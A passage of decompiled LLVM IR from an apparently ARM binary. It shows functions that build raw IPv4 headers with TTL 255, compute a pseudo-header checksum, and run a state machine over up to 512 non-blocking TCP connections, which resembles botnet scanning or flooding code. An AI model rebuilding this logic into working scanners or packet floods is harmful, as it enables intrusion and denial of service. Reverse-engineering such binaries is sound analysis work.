; uselistorder directives
  uselistorder i32 %v2_ae34, { 1, 0 }
  uselistorder i32 %v5_ae18, { 1, 0 }
  uselistorder i32 %v2_ae14, { 2, 0, 3, 1 }
  uselistorder i32 %v3_ae3c40, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_ae50.ph, { 2, 1, 0 }
  uselistorder i32 %v2_adbc, { 0, 2, 1 }
  uselistorder i32 %v1_ad88, { 0, 2, 1 }
  uselistorder i32 %v2_ad68, { 0, 2, 1 }
  uselistorder i32 %v2_ad64, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_add4, { 1, 0 }
  uselistorder label %dec_label_pc_ad50, { 1, 0 }
}

define i32 @function_ae78(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ae78:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ae7c = load i32, i32* @fp, align 4
  store i32 44676, i32* %stack_var_-4, align 4
  %v2_ae80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ae80, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_aea0 = add i32 %arg1, 12
  %v2_aea0 = inttoptr i32 %v1_aea0 to i32*
  %v3_aea0 = load i32, i32* %v2_aea0, align 4
  store i32 %v3_aea0, i32* %stack_var_-44, align 4
  %v1_aec8 = call i32 @function_125e0(i32 20)
  %v1_aee4 = call i32 @function_12b00(i32 32)
  %v2_aef0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_aef0, i32* @r3, align 4
  store i32 %v1_aee4, i32* @r0, align 4
  store i32 %v2_aef0, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_af00 = call i32 @function_12050()
  %v1_af08 = add i32 %v1_aee4, 12
  store i32 %v1_af08, i32* @r3, align 4
  store i32 %v1_af08, i32* @r0, align 4
  %v3_af10 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_af10, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_af18 = call i32 @function_12050()
  %v2_af24 = inttoptr i32 %v1_aee4 to i16*
  %v3_af24 = call i32 @function_ad24(i16* %v2_af24, i32 32)
  %sext = mul i32 %v3_af24, 65536
  %v1_af28 = sdiv i32 %sext, 65536
  store i32 %v1_aee4, i32* @r0, align 4
  %v0_af34 = call i32 @function_13684()
  %v4_af38 = urem i32 %v1_af28, 65536
  store i32 %v3_ae7c, i32* @fp, align 4
  ret i32 %v4_af38

; uselistorder directives
  uselistorder i32 %v1_aee4, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @function_af4c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_af4c:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_af50 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_afbc = add i32 %tmp3, 1
  %v4_afbc = inttoptr i32 %v3_afbc to i8*
  store i8 0, i8* %v4_afbc, align 1
  %v3_afc0 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_afc0, 20
  %v1_afdc = trunc i32 %fold to i16
  %v3_afdc = add i32 %tmp3, 2
  %v4_afdc = inttoptr i32 %v3_afdc to i16*
  store i16 %v1_afdc, i16* %v4_afdc, align 2
  %v0_afe0 = call i32 @function_8440()
  %v1_aff4 = trunc i32 %v0_afe0 to i16
  %v3_aff4 = add i32 %tmp3, 4
  %v4_aff4 = inttoptr i32 %v3_aff4 to i16*
  store i16 %v1_aff4, i16* %v4_aff4, align 2
  %v3_b000 = add i32 %tmp3, 6
  %v4_b000 = inttoptr i32 %v3_b000 to i16*
  store i16 0, i16* %v4_b000, align 2
  %v3_b00c = add i32 %tmp3, 8
  %v4_b00c = inttoptr i32 %v3_b00c to i8*
  store i8 -1, i8* %v4_b00c, align 1
  %v3_b018 = add i32 %tmp3, 9
  %v4_b018 = inttoptr i32 %v3_b018 to i8*
  store i8 %tmp, i8* %v4_b018, align 1
  %v3_b024 = add i32 %tmp3, 10
  %v4_b024 = inttoptr i32 %v3_b024 to i16*
  store i16 0, i16* %v4_b024, align 2
  %v2_b030 = add i32 %tmp3, 12
  %v3_b030 = inttoptr i32 %v2_b030 to i32*
  store i32 %arg3, i32* %v3_b030, align 4
  %v2_b03c = add i32 %tmp3, 16
  %v3_b03c = inttoptr i32 %v2_b03c to i32*
  store i32 %arg2, i32* %v3_b03c, align 4
  store i32 %v3_af50, i32* @fp, align 4
  ret i32 %v0_afe0

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 0 }
}

define i32 @function_b04c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b04c:
  %v8_b068 = icmp sgt i32 %arg1, 2
  br i1 %v8_b068, label %dec_label_pc_b078, label %dec_label_pc_b088

dec_label_pc_b078:                                ; preds = %dec_label_pc_b04c
  %v1_b07c = call i32 @function_108d0(i32 %arg1)
  br label %dec_label_pc_b088

dec_label_pc_b088:                                ; preds = %dec_label_pc_b04c, %dec_label_pc_b078
  %storemerge1 = phi i32 [ 0, %dec_label_pc_b078 ], [ 1, %dec_label_pc_b04c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_b088, { 1, 0 }
}

define i32 @function_b09c(i32 %arg1) local_unnamed_addr {
dec_label_pc_b09c:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b09c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b09c, i32* %ip.global-to-local, align 4
  %v3_b0a0 = load i32, i32* @r4, align 4
  store i32 %v3_b0a0, i32* %stack_var_-24, align 4
  store i32 45224, i32* %stack_var_-4, align 4
  %v19_b0a0 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b0a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0a4, i32* @fp, align 4
  %v0_b0ac = call i32 @function_10644()
  %v1_b0b4 = add i32 %v0_b0ac, 3
  store i32 %v1_b0b4, i32* %r2.global-to-local, align 4
  %v1_b0b8 = icmp slt i32 %v0_b0ac, 0
  br i1 %v1_b0b8, label %bb, label %bb37

bb:                                               ; preds = %dec_label_pc_b09c
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_b09c, %bb
  %v0_b0c0 = phi i32 [ %v0_b0ac, %dec_label_pc_b09c ], [ %v1_b0b4, %bb ]
  %v3_b0c0 = sdiv i32 %v0_b0c0, 4
  store i32 %v3_b0c0, i32* %r2.global-to-local, align 4
  %v2_b0d0 = mul nsw i32 %v3_b0c0, 3
  %v5_b0e0 = icmp slt i32 %v2_b0d0, 512
  br i1 %v5_b0e0, label %bb39, label %bb38

bb38:                                             ; preds = %bb37
  br label %bb39

bb39:                                             ; preds = %bb37, %bb38
  %v0_b0e4 = phi i32 [ %v2_b0d0, %bb37 ], [ 512, %bb38 ]
  store i32 2, i32* %stack_var_-212, align 4
  %v1_b0f4 = call i32 @function_125e0(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_b114 = bitcast i32* %stack_var_-204 to i8*
  %v3_b114 = call i32 @function_11f30(i8* %v2_b114, i32 0)
  %v2_b124 = mul i32 %v0_b0e4, 24
  %v1_b128 = or i32 %v2_b124, 7
  %v1_b12c = add i32 %v1_b128, 7
  %v3_b130 = and i32 %v1_b12c, -8
  %v1_b138 = load i32, i32* @sp, align 4
  %v2_b138 = sub i32 %v1_b138, %v3_b130
  %v1_b148 = add i32 %v2_b138, 23
  %v3_b14c = and i32 %v1_b148, -8
  %v2_b170 = mul i32 %v0_b0e4, 5
  store i32 %v2_b170, i32* @r2, align 4
  %v2_b180 = inttoptr i32 %v3_b14c to i8*
  %v3_b180 = call i32 @function_11f30(i8* %v2_b180, i32 0)
  %v2_b208 = add i32 %v3_b14c, 20
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_b23c58 = icmp sgt i32 %v0_b0e4, 0
  br i1 %v5_b23c58, label %dec_label_pc_b190, label %dec_label_pc_b240.preheader

dec_label_pc_b190:                                ; preds = %bb39, %dec_label_pc_b190
  %storemerge359 = phi i32 [ %v1_b228, %dec_label_pc_b190 ], [ 0, %bb39 ]
  %v3_b19c = mul i32 %storemerge359, 8
  %v2_b1a4 = mul nuw nsw i32 %storemerge359, 24
  %v2_b1a8 = add i32 %v2_b1a4, %v3_b14c
  %v2_b1ac = add i32 %v2_b1a8, 8
  store i32 %v2_b1ac, i32* %r2.global-to-local, align 4
  %v3_b1b4 = add i32 %v2_b1a8, 9
  %v4_b1b4 = inttoptr i32 %v3_b1b4 to i8*
  store i8 1, i8* %v4_b1b4, align 1
  store i32 %storemerge359, i32* @r4, align 4
  %v1_b1c0 = call i32 @function_12b00(i32 1024)
  store i32 20, i32* %ip.global-to-local, align 4
  %v0_b1d4 = load i32, i32* @r4, align 4
  %v2_b1e0 = mul i32 %v0_b1d4, 24
  %v2_b1e8 = add i32 %v2_b208, %v2_b1e0
  %v2_b1ec = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v1_b1c0, i32* %v2_b1ec, align 4
  store i32 %v3_b19c, i32* %r2.global-to-local, align 4
  %v2_b20c = add i32 %v2_b1a4, %v2_b208
  %v1_b210 = inttoptr i32 %v2_b20c to i32*
  %v2_b210 = load i32, i32* %v1_b210, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b220 = inttoptr i32 %v2_b210 to i8*
  %v3_b220 = call i32 @function_11f30(i8* %v2_b220, i32 0)
  %v1_b228 = add nuw nsw i32 %storemerge359, 1
  store i32 %v1_b228, i32* %r2.global-to-local, align 4
  %v5_b23c = icmp slt i32 %v1_b228, %v0_b0e4
  br i1 %v5_b23c, label %dec_label_pc_b190, label %dec_label_pc_b240.preheader

dec_label_pc_b240.preheader:                      ; preds = %dec_label_pc_b190, %bb39
  %v2_b630 = ptrtoint i32* %stack_var_-212 to i32
  %v2_b720 = add i32 %v3_b14c, 12
  %v2_b76c = ptrtoint i32* %stack_var_-180 to i32
  %v2_b860 = ptrtoint i32* %stack_var_-188 to i32
  %v2_b8bc = ptrtoint i32* %stack_var_-196 to i32
  %v2_b8c0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_bcc0 = add i32 %v3_b14c, 16
  %v2_b7d8 = add i32 %v19_b0a0, -156
  br label %dec_label_pc_b240

dec_label_pc_b240:                                ; preds = %dec_label_pc_b240, %dec_label_pc_cfc0, %dec_label_pc_b240.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_b23c58, label %dec_label_pc_b24c, label %dec_label_pc_b240

dec_label_pc_b24c:                                ; preds = %dec_label_pc_b240, %dec_label_pc_cfc0
  %storemerge450 = phi i32 [ %v1_cfc4, %dec_label_pc_cfc0 ], [ 0, %dec_label_pc_b240 ]
  %v3_b258 = mul i32 %storemerge450, 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b260 = mul nuw nsw i32 %storemerge450, 24
  %v2_b264 = add i32 %v2_b260, %v3_b14c
  %v2_b268 = add i32 %v2_b264, 8
  %v1_b26c = inttoptr i32 %v2_b268 to i8*
  %v2_b26c = load i8, i8* %v1_b26c, align 8
  %v3_b26c = sext i8 %v2_b26c to i32
  switch i32 %v3_b26c, label %dec_label_pc_cfc0 [
    i32 0, label %dec_label_pc_b2a0
    i32 1, label %dec_label_pc_b708
    i32 2, label %dec_label_pc_bba4
    i32 3, label %dec_label_pc_bed0
    i32 4, label %dec_label_pc_c0d0
    i32 5, label %dec_label_pc_c4b8
    i32 6, label %dec_label_pc_c6b8
    i32 7, label %dec_label_pc_cb50
    i32 8, label %dec_label_pc_cda8
  ]

dec_label_pc_b2a0:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b2bc = add i32 %v2_b260, %v2_b208
  %v1_b2c0 = inttoptr i32 %v2_b2bc to i32*
  %v2_b2c0 = load i32, i32* %v1_b2c0, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b2d0 = inttoptr i32 %v2_b2c0 to i8*
  %v3_b2d0 = call i32 @function_11f30(i8* %v2_b2d0, i32 0)
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_b2f4 = add i32 %v2_b264, 9
  %v2_b2f4 = inttoptr i32 %v1_b2f4 to i8*
  %v3_b2f4 = load i8, i8* %v2_b2f4, align 1
  %v2_b2f8 = icmp eq i8 %v3_b2f4, 0
  br i1 %v2_b2f8, label %dec_label_pc_b3ac, label %dec_label_pc_b300

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2a0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b320 = load i32, i32* %v1_b2c0, align 4
  store i32 24, i32* @r2, align 4
  %v2_b34c = inttoptr i32 %v2_b264 to i8*
  %v3_b34c = call i32 @function_11f30(i8* %v2_b34c, i32 0)
  %v2_b36c = add i32 %v2_b264, 20
  store i32 %v2_b36c, i32* %r2.global-to-local, align 4
  %v2_b374 = inttoptr i32 %v2_b36c to i32*
  store i32 %v2_b320, i32* %v2_b374, align 4
  store i32 %storemerge450, i32* @r4, align 4
  %v4_b37c = call i32 @function_a858(i32 20, i32 %v3_b14c, i32 %v2_b36c, i32 %v2_b320)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b38c = load i32, i32* @r4, align 4
  %v3_b390 = mul i32 %v0_b38c, 8
  store i32 %v3_b390, i32* %r2.global-to-local, align 4
  %v2_b398 = mul i32 %v0_b38c, 24
  %v2_b39c = add i32 %v2_b398, %v3_b14c
  %v2_b3a0 = or i32 %v2_b39c, 4
  %v2_b3a4 = inttoptr i32 %v2_b3a0 to i32*
  store i32 %v4_b37c, i32* %v2_b3a4, align 4
  br label %dec_label_pc_b508

dec_label_pc_b3ac:                                ; preds = %dec_label_pc_b2a0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_b3d0 = add i32 %v2_b264, 11
  %v2_b3d0 = inttoptr i32 %v1_b3d0 to i8*
  %v3_b3d0 = load i8, i8* %v2_b3d0, align 1
  %v1_b3d4 = add i8 %v3_b3d0, 1
  store i32 %v3_b14c, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_b3d4, i8* %v2_b3d0, align 1
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v3_b424 = load i8, i8* %v2_b3d0, align 1
  %v7_b428 = icmp eq i8 %v3_b424, 10
  br i1 %v7_b428, label %dec_label_pc_b430, label %dec_label_pc_b3ac.dec_label_pc_b4b0_crit_edge

dec_label_pc_b3ac.dec_label_pc_b4b0_crit_edge:    ; preds = %dec_label_pc_b3ac
  %.pre = add i32 %v2_b264, 10
  %.pre60 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_b4b0

dec_label_pc_b430:                                ; preds = %dec_label_pc_b3ac
  store i8 0, i8* %v2_b3d0, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_b47c = add i32 %v2_b264, 10
  %v2_b47c = inttoptr i32 %v1_b47c to i8*
  %v3_b47c = load i8, i8* %v2_b47c, align 2
  %v1_b480 = add i8 %v3_b47c, 1
  store i32 %v3_b14c, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 %v1_b480, i8* %v2_b47c, align 2
  br label %dec_label_pc_b4b0

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b3ac.dec_label_pc_b4b0_crit_edge, %dec_label_pc_b430
  %v2_b4d0.pre-phi = phi i8* [ %.pre60, %dec_label_pc_b3ac.dec_label_pc_b4b0_crit_edge ], [ %v2_b47c, %dec_label_pc_b430 ]
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v3_b4d0 = load i8, i8* %v2_b4d0.pre-phi, align 2
  %v7_b4d4 = icmp eq i8 %v3_b4d0, 3
  br i1 %v7_b4d4, label %dec_label_pc_b4dc, label %dec_label_pc_b508

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b4b0
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_b2f4, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_b508:                                ; preds = %dec_label_pc_b4b0, %dec_label_pc_b300
  store i32 2, i32* %stack_var_-212, align 4
  %v1_b514 = call i32 @function_125e0(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_b534 = call i32 @function_11f30(i8* %v2_b114, i32 0)
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  store i32 %storemerge450, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b570 = call i32 @function_128b8(i32 2, i32 1, i32 0)
  %v0_b578 = load i32, i32* @r4, align 4
  %v2_b584 = mul i32 %v0_b578, 24
  %v2_b588 = add i32 %v2_b584, %v3_b14c
  %v2_b58c = inttoptr i32 %v2_b588 to i32*
  store i32 %v3_b570, i32* %v2_b58c, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_b5a8 = inttoptr i32 %v2_b264 to i32*
  %v2_b5a8 = load i32, i32* %v1_b5a8, align 8
  %v7_b5ac = icmp eq i32 %v2_b5a8, -1
  br i1 %v7_b5ac, label %dec_label_pc_cfc0, label %dec_label_pc_b5b4

dec_label_pc_b5b4:                                ; preds = %dec_label_pc_b508
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b5cc = load i32, i32* %v1_b5a8, align 8
  store i32 %v2_b5cc, i32* @r4, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b5e8 = load i32, i32* %v1_b5a8, align 8
  store i32 %v2_b5e8, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b5f8 = call i32 @function_106d8(i32 %v2_b5e8, i32 3)
  %v1_b600 = or i32 %v2_b5f8, 2048
  store i32 %v1_b600, i32* @r3, align 4
  %v0_b604 = load i32, i32* @r4, align 4
  store i32 %v1_b600, i32* %r2.global-to-local, align 4
  %v2_b610 = call i32 @function_106d8(i32 %v0_b604, i32 4)
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b62c = load i32, i32* %v1_b5a8, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_b640 = call i32 @function_12710(i32 %v2_b62c, i32 %v2_b630, i32 16)
  %v3_b648 = icmp eq i32 %v3_b640, -1
  br i1 %v3_b648, label %dec_label_pc_b650, label %dec_label_pc_b6b4

dec_label_pc_b650:                                ; preds = %dec_label_pc_b5b4
  %v0_b650 = call i32 @function_1095c()
  %v1_b658 = inttoptr i32 %v0_b650 to i32*
  %v2_b658 = load i32, i32* %v1_b658, align 4
  %v7_b65c = icmp eq i32 %v2_b658, 115
  br i1 %v7_b65c, label %dec_label_pc_b6b4, label %dec_label_pc_b664

dec_label_pc_b664:                                ; preds = %dec_label_pc_b650
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b67c = load i32, i32* %v1_b5a8, align 8
  %v3_b684 = call i32 @function_b04c(i32 %v2_b67c, i32 %v3_b14c, i32 %v3_b258)
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_b2f4, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_b6b4:                                ; preds = %dec_label_pc_b5b4, %dec_label_pc_b650
  store i8 1, i8* %v1_b26c, align 8
  %v2_b6f8 = add i32 %v2_b264, 12
  store i32 %v2_b6f8, i32* %r2.global-to-local, align 4
  %v2_b700 = inttoptr i32 %v2_b6f8 to i32*
  store i32 0, i32* %v2_b700, align 4
  br label %dec_label_pc_cfc0

dec_label_pc_b708:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b724 = add i32 %v2_b260, %v2_b720
  %v1_b728 = inttoptr i32 %v2_b724 to i32*
  %v2_b728 = load i32, i32* %v1_b728, align 4
  %v2_b72c = icmp eq i32 %v2_b728, 0
  br i1 %v2_b72c, label %dec_label_pc_b734, label %dec_label_pc_b780.lr.ph

dec_label_pc_b734:                                ; preds = %dec_label_pc_b708
  store i32 %storemerge450, i32* @r4, align 4
  %v2_b73c = call i32 @function_1051c(i32* null)
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_b750 = load i32, i32* @r4, align 4
  %v3_b754 = mul i32 %v0_b750, 8
  store i32 %v3_b754, i32* %r2.global-to-local, align 4
  %v2_b75c = mul i32 %v0_b750, 24
  %v2_b764 = add i32 %v2_b720, %v2_b75c
  %v2_b768 = inttoptr i32 %v2_b764 to i32*
  store i32 %v2_b73c, i32* %v2_b768, align 4
  br label %dec_label_pc_b780.lr.ph

dec_label_pc_b780.lr.ph:                          ; preds = %dec_label_pc_b734, %dec_label_pc_b708
  br label %dec_label_pc_b780

dec_label_pc_b780:                                ; preds = %dec_label_pc_b780.lr.ph, %dec_label_pc_b780
  %storemerge59 = phi i32 [ 0, %dec_label_pc_b780.lr.ph ], [ %v1_b794, %dec_label_pc_b780 ]
  store i32 %v2_b76c, i32* %r2.global-to-local, align 4
  %v5_b78c = mul nuw nsw i32 %storemerge59, 4
  %v6_b78c = add i32 %v5_b78c, %v2_b76c
  %v7_b78c = inttoptr i32 %v6_b78c to i32*
  store i32 0, i32* %v7_b78c, align 4
  %v1_b794 = add nuw nsw i32 %storemerge59, 1
  %tmp40 = icmp ult i32 %v1_b794, 32
  br i1 %tmp40, label %dec_label_pc_b780, label %dec_label_pc_b7a8

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b780
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_b7c0 = inttoptr i32 %v2_b264 to i32*
  %v2_b7c0 = load i32, i32* %v1_b7c0, align 8
  %v3_b7c4 = udiv i32 %v2_b7c0, 32
  store i32 -156, i32* %r2.global-to-local, align 4
  %v3_b7d0 = mul nuw nsw i32 %v3_b7c4, 4
  %v2_b7dc = add i32 %v2_b7d8, %v3_b7d0
  %v1_b7e0 = inttoptr i32 %v2_b7dc to i32*
  %v2_b7e0 = load i32, i32* %v1_b7e0, align 4
  store i32 %v2_b7e0, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b7fc = load i32, i32* %v1_b7c0, align 8
  %v1_b800 = urem i32 %v2_b7fc, 32
  %v6_b808 = shl i32 1, %v1_b800
  %v2_b80c = or i32 %v6_b808, %v2_b7e0
  store i32 %v2_b80c, i32* %v1_b7e0, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b854 = load i32, i32* %v1_b7c0, align 8
  %v1_b858 = add i32 %v2_b854, 1
  store i32 %v1_b858, i32* %r2.global-to-local, align 4
  store i32 %v2_b76c, i32* %ip.global-to-local, align 4
  %v1_b864 = load i32, i32* @sp, align 4
  %v2_b864 = inttoptr i32 %v1_b864 to i32*
  store i32 %v2_b860, i32* %v2_b864, align 4
  %v0_b868 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b76c, i32* %r2.global-to-local, align 4
  %v4_b878 = load i32, i32* %stack_var_-188, align 4
  %v5_b878 = call i32 @function_1059c(i32 %v0_b868, i32 0, i32 %v2_b76c, i32 0, i32 %v4_b878)
  %v7_b888 = icmp eq i32 %v5_b878, 1
  br i1 %v7_b888, label %dec_label_pc_b890, label %dec_label_pc_ba70

dec_label_pc_b890:                                ; preds = %dec_label_pc_b7a8
  store i32 4, i32* %stack_var_-192, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b8b8 = load i32, i32* %v1_b7c0, align 8
  store i32 %v2_b8b8, i32* %r2.global-to-local, align 4
  store i32 %v2_b8bc, i32* %ip.global-to-local, align 4
  %v1_b8c4 = load i32, i32* @sp, align 4
  %v2_b8c4 = inttoptr i32 %v1_b8c4 to i32*
  store i32 %v2_b8c0, i32* %v2_b8c4, align 4
  %v0_b8c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_b8d8 = load i32, i32* %stack_var_-196, align 4
  %v5_b8d8 = call i32 @function_12780(i32 %v0_b8c8, i32 1, i32 4, i32 %v2_b8bc, i32 %v4_b8d8)
  %v3_b8dc = load i32, i32* %stack_var_-196, align 4
  %v2_b8e0 = icmp eq i32 %v3_b8dc, 0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b978 = load i32, i32* %v1_b7c0, align 8
  br i1 %v2_b8e0, label %dec_label_pc_b960, label %dec_label_pc_b8e8

dec_label_pc_b8e8:                                ; preds = %dec_label_pc_b890
  %v3_b908 = call i32 @function_b04c(i32 %v2_b978, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_b958 = add i32 %v2_b264, 9
  %v4_b958 = inttoptr i32 %v3_b958 to i8*
  store i8 1, i8* %v4_b958, align 1
  br label %dec_label_pc_baf0

dec_label_pc_b960:                                ; preds = %dec_label_pc_b890
  store i32 %v2_b978, i32* @r4, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_b994 = load i32, i32* %v1_b7c0, align 8
  store i32 %v2_b994, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b9a4 = call i32 @function_106d8(i32 %v2_b994, i32 3)
  %v1_b9ac = and i32 %v2_b9a4, -2049
  store i32 %v1_b9ac, i32* @r3, align 4
  %v0_b9b0 = load i32, i32* @r4, align 4
  store i32 %v1_b9ac, i32* %r2.global-to-local, align 4
  %v2_b9bc = call i32 @function_106d8(i32 %v0_b9b0, i32 4)
  %v2_b9dc = add i32 %v2_b264, 12
  %v2_b9e4 = inttoptr i32 %v2_b9dc to i32*
  store i32 0, i32* %v2_b9e4, align 4
  %v2_ba04 = add i32 %v2_b264, 16
  %v3_ba0c = inttoptr i32 %v2_ba04 to i16*
  store i16 0, i16* %v3_ba0c, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_ba2c = add i32 %v2_b260, %v2_b208
  %v1_ba30 = inttoptr i32 %v2_ba2c to i32*
  %v2_ba30 = load i32, i32* %v1_ba30, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ba40 = inttoptr i32 %v2_ba30 to i8*
  %v3_ba40 = call i32 @function_11f30(i8* %v2_ba40, i32 0)
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_b26c, align 8
  br label %dec_label_pc_cfc0

dec_label_pc_ba70:                                ; preds = %dec_label_pc_b7a8
  %v3_ba74 = icmp eq i32 %v5_b878, -1
  br i1 %v3_ba74, label %dec_label_pc_ba7c, label %dec_label_pc_baf0

dec_label_pc_ba7c:                                ; preds = %dec_label_pc_ba70
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_ba94 = load i32, i32* %v1_b7c0, align 8
  %v3_ba9c = call i32 @function_b04c(i32 %v2_ba94, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_baec = add i32 %v2_b264, 9
  %v4_baec = inttoptr i32 %v3_baec to i8*
  store i8 1, i8* %v4_baec, align 1
  br label %dec_label_pc_baf0

dec_label_pc_baf0:                                ; preds = %dec_label_pc_ba70, %dec_label_pc_b8e8, %dec_label_pc_ba7c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bb10 = load i32, i32* %v1_b728, align 4
  %v1_bb14 = add i32 %v2_bb10, 10
  store i32 %v1_bb14, i32* @r4, align 4
  %v2_bb1c = call i32 @function_1051c(i32* null)
  %v0_bb24 = load i32, i32* @r4, align 4
  %v3_bb24 = icmp ult i32 %v0_bb24, %v2_bb1c
  br i1 %v3_bb24, label %dec_label_pc_bb2c, label %dec_label_pc_cfc0

dec_label_pc_bb2c:                                ; preds = %dec_label_pc_baf0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bb44 = load i32, i32* %v1_b7c0, align 8
  %v3_bb4c = call i32 @function_b04c(i32 %v2_bb44, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_bb9c = add i32 %v2_b264, 9
  %v4_bb9c = inttoptr i32 %v3_bb9c to i8*
  store i8 1, i8* %v4_bb9c, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_bba4:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bbc0 = add i32 %v2_b260, %v2_b720
  %v1_bbc4 = inttoptr i32 %v2_bbc0 to i32*
  %v2_bbc4 = load i32, i32* %v1_bbc4, align 4
  %v2_bbc8 = icmp eq i32 %v2_bbc4, 0
  br i1 %v2_bbc8, label %dec_label_pc_bbd0, label %dec_label_pc_bc08

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bba4
